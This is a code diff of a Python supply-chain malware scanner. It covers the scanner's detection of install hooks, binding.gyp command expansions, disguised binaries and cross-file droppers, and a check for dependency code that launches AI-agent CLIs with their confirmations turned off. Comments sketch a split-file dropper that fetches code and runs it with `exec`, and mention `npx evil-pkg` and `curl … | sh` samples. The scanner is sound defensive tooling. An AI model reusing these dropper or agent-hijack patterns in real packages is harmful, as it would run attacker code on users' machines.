-_AGENT_BIN_CMD_RE = re.compile(_AGENT_BIN_CMD_SRC)
-_AGENT_FLAG_RE = re.compile(_AGENT_FLAG_SRC)
-
-
-def agent_hijack(text):
-    """-> (agent, flag, line) for the first line of dependency code that hands
-    a known AI-agent CLI, with a flag that turns off its confirmations, to an
-    exec/spawn call (see above), else None. `text` has \\n line endings."""
-    if _AGENT_FLAG_RE.search(text) is None:
-        return None
-    for i, row in enumerate(text.split("\n")):
-        if _EXEC_CALL_RE.search(row) is None:
-            continue
-        flag = _AGENT_FLAG_RE.search(row)
-        binm = _AGENT_BIN_RE.search(row)
-        if flag is not None and binm is not None:
-            return binm.group().strip("'\""), flag.group(), i + 1
-    return None
-
-
-def agent_hijack_in_command(cmd):
-    """-> (agent, flag) when an install-hook COMMAND launches the agent
-    directly (the shell is the exec, so no exec call is needed), else None."""
-    flag = _AGENT_FLAG_RE.search(cmd)
-    binm = _AGENT_BIN_CMD_RE.search(cmd)
-    if flag is not None and binm is not None:
-        return binm.group().strip("'\""), flag.group()
-    return None
 
 
 _AGENT_HIJACK_WHY = (
@@ -9433,40 +4844,12 @@ def dependency_agent_issue(path, text):
     return _agent_hijack_issue(path, line, lines, agent, flag, redactor=_Redactor(lines))
 
 
-def node_candidates(rel):
-    """Files Node tries for a path it is asked to run or load."""
-    rel = rel.rstrip("/")
-    return [rel, rel + ".js", rel + ".cjs", rel + ".mjs", rel + ".json", rel + ".node",
-            rel + "/index.js", rel + "/index.cjs", rel + "/index.mjs", rel + "/index.json"]
-
-
 # ---------------- Scripts by their #! line ----------------
 # A file with no source extension still runs as code when its #! line names
 # an interpreter: a package's bin/cli, a hook's ./setup. The line is the
 # first line only (the kernel reads no further): `[ \t]`, never `\s`, which
 # took the interpreter from the next line of `#!/usr/bin/env` + newline.
 _SHEBANG_RE = re.compile(r"^#![ \t]*(\S+)(?:[ \t]+(?:-\S+[ \t]+)*(\S+))?")
-#: Interpreters that run a script as JavaScript (or TypeScript).
-_SHEBANG_JS_NAMES = frozenset({"node", "nodejs", "bun", "deno", "ts-node", "tsx"})
-
-
-def shebang_lang(text):
-    """'js' | 'py' | 'sh' | None: the language a script runs as, by its #!
-    line (`#!/usr/bin/env node`, `#!/usr/bin/env -S deno run`,
-    `#!/usr/bin/python3`, `#!/bin/sh`)."""
-    m = _SHEBANG_RE.match(text)
-    if not m:
-        return None
-    prog = m.group(1).rsplit("/", 1)[-1].lower()
-    if prog == "env" and m.group(2):
-        prog = m.group(2).rsplit("/", 1)[-1].lower()
-    if prog in _SHEBANG_JS_NAMES:
-        return "js"
-    if _PYTHON_NAME_RE.match(prog):
-        return "py"
-    if prog in _SHELL_NAMES:
-        return "sh"
-    return None
 
 
 def script_source_lang(head):
@@ -9539,17 +4922,19 @@ def scan_manifest(path, content, registry=False):
     supply-chain attack vector.
 
     G11: mere *presence* of a lifecycle script is flagged (MAJOR); a hook whose
-    command matches the fetch/eval pattern list escalates to CRITICAL. The old
-    behavior (pattern-only) was a denylist every `npx evil-pkg` or
-    `node ./scripts/payload.js` sailed through. Also covers setup.py and
-    binding.gyp via scan_file()/scan_gyp() (see collect_files).
+    command does what malicious hooks do, read as a program
+    (hook_command_risk, 0.1.8), escalates to CRITICAL. The command's download
+    and evaluation tools (INSTALL_HOOK_RE) are only a hint in the MAJOR
+    finding's message: tokens a binary installer shares. Also covers setup.py
+    and binding.gyp via scan_file()/scan_gyp() (see collect_files).
 
     Shared semantics 3: a leading BOM is stripped before parsing; an
     unparseable ROOT manifest is SC-MANIFEST-UNPARSEABLE (MAJOR). registry /
     dependency manifests count preinstall, install, postinstall; a project
     checkout also counts preprepare, prepare, postprepare, and there a
-    prepare-family hook that is not suspicious is INFO (the project's own
-    build step, e.g. `husky install`), while a suspicious one stays CRITICAL."""
+    prepare-family hook with neither a reason nor a hint is INFO (the
+    project's own build step, e.g. `husky install`), while a hostile one
+    stays CRITICAL."""
     data, issues = load_manifest(path, content)
     if data is None:
         return issues
@@ -9562,9 +4947,10 @@ def scan_manifest(path, content, registry=False):
             cmd = scripts.get(hook)
             if not isinstance(cmd, str) or not cmd.strip():
                 continue
-            suspicious = _hook_is_suspicious(cmd)
+            reasons = hook_command_risk(cmd)
+            hint = not reasons and _hook_is_suspicious(cmd)
             sev = "INFO" if (not registry and hook in NPM_PREPARE_SCRIPTS
-                             and not suspicious) else None
+                             and not reasons and not hint) else None
             # the hook's key inside "scripts", not the first line naming it
             # (review: a dependency called "install" took the finding)
             if key_lines is None:
@@ -9572,7 +4958,7 @@ def scan_manifest(path, content, registry=False):
             line_no = key_lines.get(hook) or next(
                 (i + 1 for i, l in enumerate(lines) if f'"{hook}"' in l), 1)
             issues.append(_sc_install_hook_issue(path, line_no, lines, hook, cmd,
-                                                 suspicious, sev=sev))
+                                                 reasons, sev=sev, hint=hint))
     return issues
 
 
@@ -9773,15 +5159,18 @@ _GYP_EXPANSION_FILE_WHY = (
 def scan_gyp(path, content):
     """G11: binding.gyp custom build actions run arbitrary commands at
     `node-gyp rebuild` (i.e. `npm install` of any native module). Flag each
-    action whose command matches the fetch/eval patterns, and any action at
-    all as MAJOR — same policy as package.json lifecycle scripts.
+    action whose command looks hostile read as a program (hook_command_risk)
+    CRITICAL, and any action at all as MAJOR — same policy as package.json
+    lifecycle scripts.
 
     gyp files are Python literals (single quotes, comments, trailing commas),
     so both JSON and Python-literal syntax are accepted. Actions and rules
     are found anywhere in the document (conditions, target_defaults ...).
     Command expansions ('<!(cmd)', '>!(cmd)', '^!(cmd)', '<!([argv])',
     '<!pymod_do_main(module)') also run at configure time: they are flagged
-    CRITICAL when the command fetches or evaluates code, and listed as INFO
+    CRITICAL when the command looks hostile (its value is what it prints,
+    so a request it prints is kept), MAJOR when it runs a download or
+    evaluation tool (INSTALL_HOOK_RE: a hint), and listed as INFO
     inventory when it runs a file of the package (`node index.js`,
     `node -p "require('./lib/x')"`, a pymod_do_main module) — the Miasma
     trick: a payload run from binding.gyp, with no install script. Such a
@@ -9804,21 +5193,24 @@ def scan_gyp(path, content):
     body = content[1:] if content.startswith("\ufeff") else content
     lines = body.split("\n")
     commands, truncated = _gyp_commands(data)
-    hooks = []                           # (cmd shown, kind, node, suspicious, command followed, sev)
+    hooks = []                           # (cmd shown, kind, node, reasons, command followed, sev, hint)
     listed = set()                       # the files the listed INFO expansions run
     for cmd, kind, node in commands:
         if kind == "action":
-            hooks.append((cmd, kind, node, bool(INSTALL_HOOK_RE.search(cmd)), None, None))
+            reasons = hook_command_risk(cmd)
+            hooks.append((cmd, kind, node, reasons, None, None, not reasons and bool(INSTALL_HOOK_RE.search(cmd))))
             continue
-        suspicious = bool(INSTALL_HOOK_RE.search(_GYP_NODE_REQUIRE_RE.sub(" ", cmd)))
         follow = _gyp_hook_command(cmd, kind)
-        if not suspicious:
+        # an expansion's output is its value: a request it prints is kept
+        reasons = hook_command_risk(follow, output_kept=True)
+        hint = not reasons and bool(INSTALL_HOOK_RE.search(_GYP_NODE_REQUIRE_RE.sub(" ", cmd)))
+        if not reasons and not hint:
             runs = _gyp_package_files(follow)
             if not runs or runs in listed:
                 continue                 # the usual include-path queries; a file listed already
             listed.add(runs)
         shown = f"pymod_do_main({cmd})" if kind == "pymod" else cmd
-        hooks.append((shown, kind, node, suspicious, follow, None if suspicious else "INFO"))
+        hooks.append((shown, kind, node, reasons, follow, None if reasons or hint else "INFO", hint))
     newlines = [m.start() for m in re.finditer("\n", body)] if hooks else []
     first_line = {}
 
@@ -9837,11 +5229,11 @@ def scan_gyp(path, content):
         return first_line[cmd]
 
     redactor = _LineRedactor(lines)
-    for cmd, kind, node, suspicious, follow, sev in hooks[:GYP_MAX_HOOK_FINDINGS]:
+    for cmd, kind, node, reasons, follow, sev, hint in hooks[:GYP_MAX_HOOK_FINDINGS]:
         issue = _sc_install_hook_issue(
             path, line_of(cmd, kind, node), lines,
             "binding.gyp action" if kind == "action" else "binding.gyp command expansion",
-            cmd, suspicious, sev=sev, redactor=redactor)
+            cmd, reasons, sev=sev, redactor=redactor, hint=hint)
         if follow is not None:
             issue["cmd"] = follow        # what a --deps scan and the registry follow
         if sev == "INFO":
@@ -9854,7 +5246,7 @@ def scan_gyp(path, content):
             {"id": "SC-INSTALL-HOOK", "name": "Install hook", "type": "HOTSPOT",
              "sev": "CRITICAL" if n_bad else ("MAJOR" if any(h[5] != "INFO" for h in rest) else "INFO"),
              "msg": (f"{len(rest)} more binding.gyp actions and command expansions run code at "
-                     f"install time ({n_bad} of them fetch or evaluate code); only the first "
+                     f"install time ({n_bad} of them look hostile); only the first "
                      f"{GYP_MAX_HOOK_FINDINGS} are listed."),
              "why": ("Each action and command expansion in a binding.gyp runs a command during "
                      "`node-gyp rebuild` (npm install). A file with this many is listed in part "
@@ -9876,6 +5268,7 @@ import urllib.parse as _urlparse
 
 import lazaret as _lazaret_pkg   # __version__ (the package root imports nothing)
 VERSION = _lazaret_pkg.__version__     # what every command's --version prints
+
 
 # ---------------- File collection (the project walk) ----------------
 # The walk is the attack surface a hostile repository controls completely, so:
@@ -10050,7 +5443,8 @@ def config_skipped_issue(path, detail):
 def scan_error_issue(path, exc):
     """SC-TRUNCATED for a file (or directory) whose scan raised: the run goes
     on without its findings, and like any file not fully scanned it fails the
-    gate. It was an INFO note (Q-SCAN-ERROR), so a file whose scan died took
+    gate (engine.error_issue gives the engine's spent work budget its own
+    words, and this for any other error). It was an INFO note (Q-SCAN-ERROR), so a file whose scan died took
     its CRITICAL findings with it and the gate passed (review B3: a 6 MB
     string line overflowed the npm engine's regex stack)."""
     issue = truncated_issue(path, f"its scan failed ({type(exc).__name__}), so its findings are missing")
@@ -10521,11 +5915,22 @@ def _collect_file(path, rel, st, in_dep, col):
     if size > SOURCE_SIZE_CAP:
         issues.append(truncated_issue(
             disp, f"{size:,} bytes exceeds the {SOURCE_SIZE_CAP:,}-byte file limit"))
+        if lang is not None:             # its first bytes still tell a program (as in the registry)
+            try:
+                head = _read_prefix(path, DISGUISE_SAMPLE_BYTES)
+            except OSError:              # not read: the SC-TRUNCATED stands alone, as before
+                head = b""
+            disguised = disguised_binary(disp, head)
+            if disguised:
+                issues.append(disguised)
         return
     data = _read_prefix(path, SOURCE_SIZE_CAP + 1)
     if len(data) > SOURCE_SIZE_CAP:      # grew between the lstat and the read
         issues.append(truncated_issue(
             disp, f"read exceeded the {SOURCE_SIZE_CAP:,}-byte file limit"))
+        disguised = disguised_binary(disp, data) if lang is not None else None
+        if disguised:
+            issues.append(disguised)
         return
     if manifest:
         col["manifests"].append({"path": disp, "dep": in_dep,
@@ -10540,8 +5945,13 @@ def _collect_file(path, rel, st, in_dep, col):
         if bi:
             issues.append(bi)
         return
-    text, info = decode_source(data, lang)
-    issues.extend(encoding_issues(disp, text, info))
+    # read as the registry reads a member (0.1.8): bytes that don't decode to
+    # anything text-like are SC-TRUNCATED, not mojibake no rule can read
+    text, extra = decode_member(disp, data, lang)
+    issues.extend(extra)
+    disguised = disguised_binary(disp, data)     # a program under a source file's name (0.1.8)
+    if disguised:
+        issues.append(disguised)
     col["files"].append({"path": disp, "content": text, "lang": lang, "dep": in_dep})
 
 
@@ -10620,7 +6030,7 @@ def _collect(root, excludes=(), include_deps=False):
                               else exc.strerror or type(exc).__name__)
                     issues.append(unreadable_issue(_fs_display(rel), reason))
                 except Exception as exc:        # one file must never kill the walk
-                    issues.append(scan_error_issue(_fs_display(rel), exc))
+                    issues.append(engine.error_issue(_fs_display(rel), exc))
         push = []
         for e, rel, st in subdirs:
             name = e.name
@@ -10631,7 +6041,7 @@ def _collect(root, excludes=(), include_deps=False):
                 try:
                     _check_pycache(rel, e.path, names, issues)
                 except Exception as exc:
-                    issues.append(scan_error_issue(_fs_display(rel), exc))
+                    issues.append(engine.error_issue(_fs_display(rel), exc))
                 continue
             key = (st.st_dev, st.st_ino)
             if st.st_ino and key in seen_dirs:
@@ -10699,8 +6109,23 @@ def _scan_manifest_entry(mf):
 #   * every JavaScript or Python file of a dependency that no hook runs gets
 #     import_time_risk: SC-IMPORT-RISK (MAJOR). On a real node_modules of
 #     14,286 JavaScript files (webpack, next, jest, eslint, typescript ...)
-#     it found nothing.
+#     it found nothing. (The detection round) But not a web app's static
+#     assets, which run in a browser, not in Node or Python: a JavaScript
+#     file in a _next, static or public directory of its package
+#     (_DEPS_WEB_DIRS) that none of its npm package's entry points reach —
+#     main, module, bin and exports, then the local files they require and
+#     import and the scripts they start (_deps_web_assets) — is left out of
+#     the import-time test and the cross-file follower, as the registry
+#     leaves it out of what runs.
+#     litellm's proxy UI ships a Next.js export whose chunk of guardrail test
+#     prompts (one shows `curl … | sh`) the test read as code, CRITICAL; a
+#     package whose main points into static/ is still read.
 # Twin of the npm engine's js/src/deps.js.
+_DEPS_WEB_DIRS = frozenset({"_next", "static", "public"})
+_DEPS_REACH_MAX = 5000          # files an npm package's entry points are followed to, at most
+_DEPS_LOCAL_DEP_RE = re.compile(
+    r"""(?:\brequire\s*\(\s*|\bimport\s*\(\s*|\bfrom\s+|^\s*import\s+|\bexport\s+[^'"\n;]*?\bfrom\s+)"""
+    r"""(['"])(\.{1,2}/[^'"\n]+)\1""", re.M)
 _DEP_IMPORT_RISK_WHY = (
     "An installed package's code runs with the application's privileges when it is loaded "
     "or its command runs. Collecting credentials or the whole environment next to a network "
@@ -10781,1214 +6206,10 @@ class _DependencyTree:
         return next((c for c in candidates[6:] if self.is_file(c)), None)
 
 
-# ---------------- Cross-file received code (both engines since 0.1.8) ----------------
-# A dropper can split the network source and the code-runner across files of
-# one package, so neither file alone trips the single-file detector:
-#     _net.py:      def pull(): return requests.get(URL).text
-#     __init__.py:  from ._net import pull; exec(pull())
-# The follower reads a package's own files (a Python top-level package, or an
-# npm package) as modules: what each defines (functions, values, classes and
-# their methods and attributes, static or not, and object literals, whose
-# members are read like a class's static ones), imports (a name, a module, a
-# default; import_module, __import__ and import() by a literal name, and
-# require(path.join(__dirname, …))) and exports (npm: module.exports and its
-# object literal, exports.x and exports['x'], export …, export default {…},
-# the re-exports export … from, export * from, module.exports = require(…),
-# and TypeScript's Object.defineProperty(exports, …) getters and
-# exports.default), and the environment variables it sets. A symbol holds a
-# received value when what it returns or is assigned carries a network
-# source, or names a symbol that holds one — through a wrapper, a re-export,
-# a class method (self.x / this.x), up to _XF_ROUNDS hops — or when its body
-# receives one and hands it to a callback: a parameter it calls, or a
-# Promise's resolve. A write into a module-level name (CACHE['c'] = …,
-# cache.code = …) or an instance's own (self.data = …) is read like an
-# assignment of it. Each module is then read by the single-file detector
-# with the names that hold a received value in it seeded (extra_always): a
-# function or value imported by name, a module's members (m.pull,
-# pkg._net.pull), a class's static members (C.pull, api.pull) and an
-# instance's (c = C(); c.pull(), self.c = C(); self.c.pull(), new ns.C(),
-# C().pull() read as one name), and an environment variable another file set
-# to a received value. The other way round, a function of the package that
-# runs its parameter as code (def execute(c): exec(c)) is a runner in every
-# file that imports it (extra_runners): the value is received there and run
-# by the other file's function.
-# It fires only when the flow crosses files — a file whose own text shows it
-# is the single-file test's — at the single-file severity (SC-IMPORT-RISK,
-# CRITICAL for running what was received); comments and docstrings are read
-# out first (a usage example is not code). Export detection is liberal (a
-# function that fetches and returns is an export an HTTP library has too);
-# the finding stays precise because it needs the value to be run.
-# Bounded: _XF_MAX_FILES files and _XF_MAX_SYMBOLS symbols per package, a
-# body read for _XF_WINDOW rows, an object literal for _XF_OBJECT_ROWS,
-# _XF_MAX_SEEDS seeds per file, _XF_MAX_RUNNERS functions tested for running
-# a parameter.
-_XF_WINDOW = 25                 # rows of a function / method body read
-_XF_MAX_FILES = 3000            # files per package the follower groups
-_XF_MAX_SEEDS = 64              # cross-file seeds fed into one file
-_XF_ROUNDS = 4                  # hops followed through wrappers and re-exports
-_XF_MAX_SYMBOLS = 5000          # symbols per package
-_XF_MAX_DEPTH = 8               # re-exports followed to what they name
-_XF_LOCAL_DEPTH = 3             # a body's locals followed to its return
-_XF_OBJECT_ROWS = 400           # rows of an object literal read for its members
-_XF_MAX_RUNNERS = 200           # functions per package tested for running a parameter
-_XF_MAX_CHARS = 2_000_000       # a longer file (a bundle) is not read for what it defines
-
-_XF_CLASS_RE = re.compile(r"^[ \t]*class[ \t]+(?P<name>[A-Za-z_]\w*)")
-_XF_DEF_RE = re.compile(r"^[ \t]*(?:async[ \t]+)?def[ \t]+(?P<name>[A-Za-z_]\w*)[ \t]*\(")
-_XF_ASSIGN_RE = re.compile(r"^(?P<indent>[ \t]*)(?P<name>[A-Za-z_]\w*)[ \t]*=(?![=])(?P<rhs>.*)$")
-_XF_RETURN_RE = re.compile(r"^[ \t]*return[ \t](?P<expr>.*)$")
-_XF_FROM_RE = re.compile(
-    r"^[ \t]*from[ \t]+(?P<mod>\.+[\w.]*|[\w.]+)[ \t]+import[ \t]+(?P<names>\*|\([^()]*\)|.+?)[ \t]*$", re.M)
-_XF_IMPORT_RE = re.compile(r"^[ \t]*import[ \t]+(?P<names>[\w.]+(?:[ \t]+as[ \t]+\w+)?(?:[ \t]*,[ \t]*[\w.]+"
-                           r"(?:[ \t]+as[ \t]+\w+)?)*)[ \t]*$", re.M)
-_XF_STATIC_RE = re.compile(r"^[ \t]*@(?:staticmethod|classmethod)\b")
-_XF_DEF_END_RE = re.compile(r"\)[^():\n]*:")
-_XF_PY_ENV_WRITE_RE = re.compile(
-    r"\b(?:os[ \t]*\.[ \t]*)?environ[ \t]*\[[ \t]*['\"](?P<var>[A-Za-z_][A-Za-z0-9_]{0,63})['\"][ \t]*\][ \t]*=(?!=)"
-    r"(?P<rhs>[^\n]*)")
-_XF_PY_DYN_IMPORT_RE = re.compile(
-    r"(?<![\w$.])(?P<local>[A-Za-z_]\w*)[ \t]*=[ \t]*(?:importlib[ \t]*\.[ \t]*)?(?P<fn>import_module|__import__)"
-    r"[ \t]*\([ \t]*['\"](?P<mod>\.{0,8}[A-Za-z_][\w.]{0,200})['\"](?P<rest>[^\n]*)")
+# ---------------- Cross-file received code (the engine's cross_file, 0.1.8) ----------------
+# The follower is the native engine's (engine.cross_file_issues); what stays
+# here is how a --deps scan groups the dependency files into packages.
 _XF_DEP_MARKERS = ("site-packages", "dist-packages", "vendor")
-# a write into a name's member: CACHE['c'] = …, cache.code = …, self.data = …
-_XF_MEMBER_WRITE_RE = re.compile(
-    r"(?<![\w$.])(?P<name>[A-Za-z_$][\w$]*)[ \t]*(?:\[[^\]\n]*\]|\.[ \t]*(?P<attr>[A-Za-z_$][\w$]*))[ \t]*=(?![=>])"
-    r"[ \t]*(?P<rhs>[^;\n]*)")
-# a function's parameters, and a body handing what it receives to one (or to a Promise's resolve)
-_XF_PARAMS_RE = re.compile(r"\((?P<params>[^()]*)\)")
-_XF_PARAM_NAME_RE = re.compile(r"[ \t]*(?:\*{1,2}|\.\.\.)?[ \t]*(?P<name>[A-Za-z_$][\w$]*)")
-_XF_ARROW_ONE_RE = re.compile(r"[ \t]*(?:async[ \t]+)?(?P<name>[A-Za-z_$][\w$]*)[ \t]*=>")
-_XF_PROMISE_RE = re.compile(
-    r"\bnew[ \t]+Promise[ \t]*\([ \t]*(?:async[ \t]+)?(?:function\b[^(\n]*\([ \t]*|\([ \t]*)?(?P<name>[A-Za-z_$][\w$]*)")
-_XF_CALL_NAME_RE = re.compile(r"(?<![\w$.])(?P<name>[A-Za-z_$][\w$]*)[ \t]*\(")
-_XF_NOT_PARAMS = frozenset({"self", "cls", "this", "async"})
-
-_XF_JS_FUNC_RE = re.compile(r"\bfunction[ \t]*\*?[ \t]*(?P<name>[A-Za-z_$][\w$]*)[ \t]*\(")
-_XF_JS_CONST_RE = re.compile(r"\b(?:const|let|var)[ \t]+(?P<name>[A-Za-z_$][\w$]*)[ \t]*=(?![=>])[ \t]*(?P<rhs>.*)$")
-_XF_JS_FN_VALUE_RE = re.compile(r"(?:async[ \t]+)?(?:function\b[^(]*\(|\([^()]*\)[ \t]*=>|[A-Za-z_$][\w$]*[ \t]*=>)")
-_XF_JS_CLASS_RE = re.compile(r"\bclass[ \t]+(?P<name>[A-Za-z_$][\w$]*)")
-# a class method's header: `pull(args) {`, `static async pull(args) {`, `*g(){`, `get x() {`
-_XF_JS_METHOD_RE = re.compile(
-    r"(?:^|[ \t;{}])(?P<static>static[ \t]+)?(?:async[ \t]+)?(?:\*[ \t]*)?(?:(?:get|set)[ \t]+)?"
-    r"(?P<name>[A-Za-z_$][\w$]*)[ \t]*\([^()]*\)[ \t]*\{")
-# a class field, at the class body's own level: `static data = …`, `data = …`
-_XF_JS_FIELD_RE = re.compile(r"^[ \t]*(?P<static>static[ \t]+)?(?P<name>[A-Za-z_$][\w$]*)[ \t]*=(?![=>])[ \t]*"
-                             r"(?P<rhs>[^;\n]*)")
-_XF_JS_KEYWORDS = frozenset({"if", "for", "while", "switch", "catch", "function", "return", "do", "else",
-                             "with", "constructor", "class"})
-_XF_JS_OBJECT_WORDS = ("const", "let", "var", "module", "export")      # what _XF_JS_OBJECT_RE needs
-_XF_JS_RETURN_RE = re.compile(r"\breturn\b[ \t]*(?P<expr>[^;\n]*)")
-_XF_JS_LOCAL_RE = re.compile(r"(?<![\w$.])(?:(?:const|let|var)[ \t]+)?(?P<name>[A-Za-z_$][\w$]*)[ \t]*=(?![=>])"
-                             r"[ \t]*(?P<rhs>[^;\n]*)")
-# an object literal whose members are read: const api = {…}, module.exports = {…}, export default {…}
-_XF_JS_OBJECT_RE = re.compile(
-    r"(?:\b(?:const|let|var)[ \t]+(?P<name>[A-Za-z_$][\w$]*)[ \t]*=|\bmodule[ \t]*\.[ \t]*exports[ \t]*="
-    r"|\bexport[ \t]+default)[ \t]*\{")
-_XF_JS_MEMBER_RE = re.compile(
-    r"(?:async[ \t]+(?=[*A-Za-z_$'\"]))?(?:\*[ \t]*)?(?:(?:get|set)[ \t]+(?=[A-Za-z_$'\"]))?['\"]?"
-    r"(?P<name>[A-Za-z_$][\w$]*)['\"]?[ \t]*(?:(?P<method>\()|(?P<colon>:)|(?=[,}]|$))")
-_XF_JS_EXPORT_DECL_RE = re.compile(
-    r"\bexport[ \t]+(?:async[ \t]+)?(?:function[ \t]*\*?[ \t]*|(?:const|let|var)[ \t]+|class[ \t]+)"
-    r"(?P<name>[A-Za-z_$][\w$]*)")
-_XF_JS_EXPORT_DEFAULT_DECL_RE = re.compile(
-    r"\bexport[ \t]+default[ \t]+(?:async[ \t]+)?(?:function\b[ \t]*\*?[ \t]*(?P<fn>[A-Za-z_$][\w$]*)?"
-    r"|class\b[ \t]*(?P<cls>[A-Za-z_$][\w$]*)?)")
-_XF_JS_EXPORT_LIST_RE = re.compile(r"\bexport[ \t]*\{(?P<names>[^{}]*)\}(?![ \t]*from\b)")
-_XF_JS_EXPORT_FROM_RE = re.compile(r"\bexport[ \t]*\{(?P<names>[^{}]*)\}[ \t]*from[ \t]*['\"](?P<mod>[^'\"\n]+)['\"]")
-_XF_JS_EXPORT_STAR_RE = re.compile(
-    r"\bexport[ \t]*\*[ \t]*(?:as[ \t]+(?P<ns>[A-Za-z_$][\w$]*)[ \t]*)?from[ \t]*['\"](?P<mod>[^'\"\n]+)['\"]")
-_XF_JS_EXPORT_DEFAULT_RE = re.compile(r"\bexport[ \t]+default[ \t]+(?P<name>[A-Za-z_$][\w$]*)[ \t]*;?[ \t]*$", re.M)
-_XF_JS_MODEXP_OBJ_RE = re.compile(r"\bmodule\s*\.\s*exports[ \t]*=[ \t]*\{(?P<names>[^{}]*)\}")
-_XF_JS_MODEXP_PROP_RE = re.compile(
-    r"\b(?:module\s*\.\s*exports|exports)\s*(?:\.\s*(?P<name>[A-Za-z_$][\w$]*)|\[\s*['\"](?P<qname>[A-Za-z_$][\w$]*)"
-    r"['\"]\s*\])[ \t]*=(?![=>])[ \t]*(?P<rhs>[^\n]*)")
-_XF_JS_MODEXP_ALL_RE = re.compile(r"\bmodule\s*\.\s*exports[ \t]*=[ \t]*(?P<name>[A-Za-z_$][\w$]*)[ \t]*;?[ \t]*$", re.M)
-_XF_JS_MODEXP_CLASS_RE = re.compile(r"\bmodule\s*\.\s*exports[ \t]*=[ \t]*class[ \t]+(?P<name>[A-Za-z_$][\w$]*)")
-_XF_JS_MODEXP_REQ_RE = re.compile(r"\bmodule\s*\.\s*exports[ \t]*=[ \t]*require\([ \t]*['\"](?P<mod>[^'\"\n]+)['\"][ \t]*\)")
-_XF_JS_MODEXP_FN_RE = re.compile(
-    r"\bmodule\s*\.\s*exports[ \t]*=[ \t]*(?=(?:async[ \t]+)?(?:function\b|\([^()]*\)[ \t]*=>|[A-Za-z_$][\w$]*[ \t]*=>))")
-_XF_JS_DEFINE_RE = re.compile(
-    r"\bObject\s*\.\s*defineProperty\(\s*exports\s*,\s*['\"](?P<name>[A-Za-z_$][\w$]*)['\"]\s*,\s*\{[^{}]*?\bget\s*:"
-    r"\s*function\s*\(\s*\)\s*\{\s*return\s+(?P<ref>[A-Za-z_$][\w$]*(?:\s*\.\s*[A-Za-z_$][\w$]*)*)")
-_XF_JS_REQ_DESTR_RE = re.compile(
-    r"\b(?:const|let|var)[ \t]*\{(?P<names>[^{}]*)\}[ \t]*=[ \t]*require\([ \t]*['\"](?P<mod>[^'\"\n]+)['\"][ \t]*\)")
-# (TypeScript's and Babel's interop helpers wrap the require: __importDefault(require("./x")))
-_XF_JS_REQ_NS_RE = re.compile(
-    r"\b(?:const|let|var)[ \t]+(?P<ns>[A-Za-z_$][\w$]*)[ \t]*=[ \t]*(?:(?:__importDefault|__importStar"
-    r"|_interopRequireDefault|_interopRequireWildcard)[ \t]*\([ \t]*)?require\([ \t]*['\"](?P<mod>[^'\"\n]+)['\"]"
-    r"[ \t]*\)(?![ \t]*\.)")
-_XF_JS_REQ_MEMBER_RE = re.compile(
-    r"\b(?:const|let|var)[ \t]+(?P<local>[A-Za-z_$][\w$]*)[ \t]*=[ \t]*require\([ \t]*['\"](?P<mod>[^'\"\n]+)['\"][ \t]*\)"
-    r"[ \t]*\.[ \t]*(?P<name>[A-Za-z_$][\w$]*)")
-_XF_JS_IMP_NAMED_RE = re.compile(
-    r"\bimport[ \t]*(?:[A-Za-z_$][\w$]*[ \t]*,[ \t]*)?\{(?P<names>[^{}]*)\}[ \t]*from[ \t]*['\"](?P<mod>[^'\"\n]+)['\"]")
-_XF_JS_IMP_NS_RE = re.compile(
-    r"\bimport[ \t]*\*[ \t]*as[ \t]+(?P<ns>[A-Za-z_$][\w$]*)[ \t]*from[ \t]*['\"](?P<mod>[^'\"\n]+)['\"]")
-_XF_JS_IMP_DEFAULT_RE = re.compile(
-    r"\bimport[ \t]+(?P<name>[A-Za-z_$][\w$]*)[ \t]*(?:,[ \t]*\{[^{}]*\})?[ \t]*from[ \t]*['\"](?P<mod>[^'\"\n]+)['\"]")
-_XF_JS_DYN_DESTR_RE = re.compile(
-    r"\b(?:const|let|var)[ \t]*\{(?P<names>[^{}]*)\}[ \t]*=[ \t]*(?:await[ \t]+)?import\([ \t]*['\"](?P<mod>[^'\"\n]+)['\"]"
-    r"[ \t]*\)")
-_XF_JS_DYN_NS_RE = re.compile(
-    r"\b(?:const|let|var)[ \t]+(?P<ns>[A-Za-z_$][\w$]*)[ \t]*=[ \t]*(?:await[ \t]+)?import\([ \t]*['\"](?P<mod>[^'\"\n]+)"
-    r"['\"][ \t]*\)")
-# a path built from the module's own directory: path.join(__dirname, 'x'), __dirname + '/x', `${__dirname}/x`
-_XF_JS_DIRNAME_RE = re.compile(
-    r"(?<![\w$])(?:path[ \t]*\.[ \t]*)?(?:join|resolve)[ \t]*\([ \t]*__dirname[ \t]*,[ \t]*['\"](?P<a>[^'\"\n]*)['\"][ \t]*\)"
-    r"|(?<![\w$.])__dirname[ \t]*\+[ \t]*['\"](?P<b>/[^'\"\n]*)['\"]"
-    r"|`\$\{__dirname\}(?P<c>/[^`$\n]*)`")
-_XF_JS_ENV_WRITE_RE = re.compile(
-    r"\bprocess\s*\.\s*env\s*(?:\.\s*(?P<a>[A-Za-z_$][\w$]*)|\[\s*['\"`](?P<b>[A-Za-z_$][\w$]*)['\"`]\s*\])\s*=(?![=>])"
-    r"(?P<rhs>[^\n]*)")
-_XF_SPACE_RE = re.compile(r"\s+")
-_XF_BRACE_RE = re.compile(r"[{}]")
-_XF_JS_LINE_COMMENT_RE = re.compile(r"(?:^|(?<=[\s;,(){}]))//")
-
-
-_XF_PY_QUOTE_RE = re.compile(r"[#'\"]")
-_XF_PY_BODY_RE = {q: re.compile(r"(?:[^\\" + q + r"]|\\.)*") for q in ("'", '"')}
-
-
-def _xf_py_mask(text):
-    """`text`'s rows with string contents blanked and comments cut, so a source
-    call or a tainted name inside a string or comment is not read as code —
-    including a triple-quoted docstring's usage example, which real network
-    libraries carry (`requests.get(...)` in a docstring is not an export). A
-    robustness heuristic, not a full tokenizer: escapes and string prefixes need
-    not be exact, because over- or under-masking only shifts the (sink-gated)
-    export approximation, never a finding on its own. Rows keep their length.
-    (A row is searched from quote to quote: character by character, litellm's
-    2,400 modules took 13 s.)"""
-    out, delim = [], None
-    for row in text.split("\n"):
-        n = len(row)
-        if delim is None and "#" not in row and "'" not in row and '"' not in row:
-            out.append(row)
-            continue
-        parts, i = [], 0
-        if delim is not None:                       # inside a triple-quoted string
-            end = row.find(delim)
-            if end < 0:
-                out.append(" " * n)
-                continue
-            i = end + 3
-            parts.append(" " * i)
-            delim = None
-        while i < n:
-            m = _XF_PY_QUOTE_RE.search(row, i)
-            if m is None:
-                parts.append(row[i:])
-                break
-            j = m.start()
-            parts.append(row[i:j])
-            ch = row[j]
-            if ch == "#":
-                parts.append(" " * (n - j))
-                break                               # comment to end of line
-            three = row[j:j + 3]
-            if three == "'''" or three == '"""':
-                end = row.find(three, j + 3)
